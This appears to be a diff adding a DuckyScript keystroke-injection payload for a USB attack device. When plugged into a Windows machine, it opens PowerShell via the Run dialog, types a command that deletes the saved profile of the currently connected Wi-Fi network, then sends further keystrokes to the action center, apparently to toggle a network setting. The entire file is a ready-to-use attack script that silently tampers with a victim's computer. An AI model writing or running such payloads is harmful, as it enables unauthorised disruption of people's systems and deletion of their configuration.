@@ -1,0 +1,22 @@
+
+
+DELAY 1000
+WINDOWS r
+DELAY 300
+STRING powershell
+DELAY 100
+ENTER
+DELAY 1000
+STRING $ssid=(netsh wlan show interfaces) -match '^\s*SSID\s*:' | % {($_ -split ':')[1].Trim()}; if ($ssid) {Write-Host "Deleting currently connected profile: $ssid"; netsh wlan delete profile name="$ssid"} else {Write-Host "Not connected to any Wi-Fi network."}
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
+WINDOWS a
+DELAY 300
+ENTER
+DELAY 600
+WINDOWS
+DELAY 600
+WINDOWS
